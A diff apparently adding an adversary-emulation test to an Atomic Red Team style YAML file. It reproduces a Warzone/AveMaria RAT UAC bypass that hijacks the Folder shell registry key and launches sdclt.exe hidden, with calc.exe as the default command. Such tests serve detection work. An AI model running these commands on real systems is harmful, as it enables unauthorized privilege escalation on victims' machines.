@@ -709,3 +709,21 @@ atomic_tests:
        reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
        reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
     name: command_prompt
+- name: Warzone/AveMaria RAT style UAC bypass
+  description: |
+    PowerShell code to bypass User Account Control using registry modification and sdclt.exe. sdclt.exe is an auto-elevated binary, and through editing the registry, it can be hijacked and a user-input process can run with those same privileges. Used by the RAT Warzone/AveMaria, most likely patched on modern Windows versions
+  supported_platforms:
+  - windows
+  input_arguments:
+    commandtorun:
+      description: Command to run
+      type: string
+      default: 'C:\Windows\System32\calc.exe'
+  executor:
+    command: |
+      reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "#{commandtorun}" /f
+      reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
+      Start-Process -FilePath "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden -PassThru
+    cleanup_command: |
+      reg delete "HKCU\Software\Classes\Folder\shell" /f
+    name: powershell
